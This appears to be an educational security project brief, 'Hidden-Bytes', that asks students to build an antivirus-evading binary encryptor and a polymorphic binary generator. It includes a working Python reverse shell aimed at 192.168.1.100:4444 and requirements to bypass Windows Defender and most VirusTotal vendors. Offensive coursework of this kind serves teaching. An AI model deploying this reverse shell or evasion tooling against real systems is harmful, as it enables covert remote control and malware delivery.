## Hidden-Bytes

<center>
<img src="pictures/hiddenbytes.jpg" style="width: 800px; height: auto;">
</center>

### Introduction

HiddenBytes challenges you to explore advanced concepts in binary manipulation, obfuscation, and stealth techniques. You will develop two interrelated programs: one that encrypts and modifies binaries while bypassing detection mechanisms and another that generates polymorphic binaries capable of maintaining functionality while dynamically changing their structure.

This project will provide insight into how attackers use advanced techniques to evade detection and ensure persistent execution while adhering to ethical and legal guidelines.

### Objective

The goal of this project is to develop:

1. **An Evasion Program**: Encrypts and modifies binaries, adding stealth techniques like file size manipulation and delayed execution to bypass detection mechanisms.
2. **A Polymorphic Program**: A program that self-modifies but retains its core functionality. This will implement a basic reverse shell payload for practical learning.

By completing this project, you will:

- Understand techniques for binary obfuscation and stealth.
- Explore polymorphic behavior in binary files.
- Learn practical approaches to bypassing antivirus detection.
- Gain hands-on experience with reverse engineering and payload delivery.
- Develop insights into ethical considerations for such techniques.

### Role Play

As part of the project, you will participate in a role-play session where you act as a **Binary Analyst** presenting your work to a team of stakeholders. Prepare to discuss:

- The structure and functionality of the binaries you developed.
- What techniques did you use to implement stealth and polymorphism?
- Recommendations for detecting and mitigating similar techniques.
- Ethical considerations and legal implications of working with obfuscated binaries.

### Reverse Shell Payload Explanation

A reverse shell payload is a piece of code that allows a target machine to initiate a connection back to an attacker's machine. This is often used in penetration testing to simulate real-world attack scenarios. In this project, you’ll implement a basic reverse shell payload for educational purposes.

#### Example:

A simple reverse shell in Python:

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))  # Replace with the attacker's IP and port
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

> ⚠️ Warning: Ensure that the reverse shell payload is tested **only** in a controlled, isolated environment, such as your virtual machine. Replace the IP and port in the example with local testing values.

### Project Requirements

#### Setup and Environment

- Use a Windows-based virtual machine as your development and testing environment.
- Ensure proper isolation to prevent unintended consequences.

#### The Challenge

1. **Evasion Program:**

- Encrypt a target binary and add stealth features:
    - File size manipulation: Increase the binary size. (e.g., 101 MB).
    - Execution delay: Ensure the binary does not execute until a specified delay (e.g., 101 seconds).
- Ensure the encrypted binary bypass detection by Windows Defender and at least 60% of security vendors on VirusTotal.

2. **Polymorphic Program:**

- Generate binaries that self-modify while maintaining their original functionality.
- Use a reverse shell as the payload for the polymorphic binary.

#### Usage Examples

**Evasion Program:**

```sh
$> evasion --help
Evasion Program Usage:
  --encrypt <target-binary>        Encrypt the target binary.
  --output <output-binary>         Specify the name of the encrypted binary file.
  --add-size <size-in-mb>          Increase the binary size (e.g., 101 MB).
  --delay <seconds>                Specify execution delay in seconds (default: 101).
$> evasion --encrypt target.exe --output obfuscated.exe --add-size 101 --delay 101
Encryption is successful! Encrypted binary saved as "obfuscated.exe".
$> obfuscated.exe
[INFO] Execution delayed by 101 seconds...
[INFO] Binary decrypted successfully.
[INFO] Target program executed.
```

**Polymorphic Program:**

```sh
$> polymorph --help
Polymorphic Program Usage:
  --generate <output-binary>       Generate a polymorphic binary.
  --payload <reverse-shell-code>   Embed the reverse shell payload.
$> polymorph --generate polymorphic.exe --payload reverse_shell_payload
Polymorphic binary generated successfully as "polymorphic.exe".
$> polymorphic.exe
[INFO] Polymorphic signature updated successfully.
[INFO] Reverse shell initialized. Attempting connection to attacker...
```

### Documentation

Create a `README.md` file that includes:

- Evasion Program Explanation: Detail how the program encrypts and modifies binaries.
- Polymorphic Program Explanation: Explain how the program generates self-modifying binaries.
- Walkthroughs: Provide step-by-step instructions for using both programs.
- Technical Insights: Include binary structure analysis, encryption methods, and stealth techniques.
- Ethical and Legal Report: Discuss ethical responsibilities and legal considerations when working with these techniques.

### Bonus

If you complete the mandatory part successfully, challenge yourself by adding additional features, such as:

- Advanced Obfuscation Techniques: Add features like API hooking, anti-debugging checks, or stealth memory allocation for obfuscating payloads further.
- Custom Encryption Algorithms: Develop your encryption algorithm for better security.
- GUI Implementation: Create a graphical interface for ease of use.

Challenge yourself!

### Ethical and Legal Considerations

This project is for educational purposes only. You are responsible for ensuring all testing is conducted within a secure, isolated environment. Do not use or share the tools developed in this project outside of its intended purpose. Misuse of these techniques is strictly prohibited and may violate local laws.

> ⚠️ Disclaimer: This project is for educational purposes only. Unauthorized use of these techniques is prohibited and may be illegal.

> ⚠️ Disclaimer: Unauthorized use of reverse shells or obfuscated binaries outside of this controlled project environment is strictly prohibited. Misuse may result in legal consequences.

### Submission and Audit

Submit the following:

- Source code for both the evasion and polymorphic programs.
- `README.md` file with detailed documentation.

Ensure that VirtualBox or equivalent software is installed for the audit.

### Resources

Some useful resources:

- [Bypassing Antivirus Dynamics](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf): Insights into bypassing antivirus systems.
- [Cryptology Resources](https://0x00sec.org/c/cryptology/): Explore cryptographic techniques.
- [Executable File Formats](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format): Learn about ELF, PE, and other formats.
- [Netcat for Reverse Shells](https://en.wikipedia.org/wiki/Netcat): Understand reverse shells and their applications.
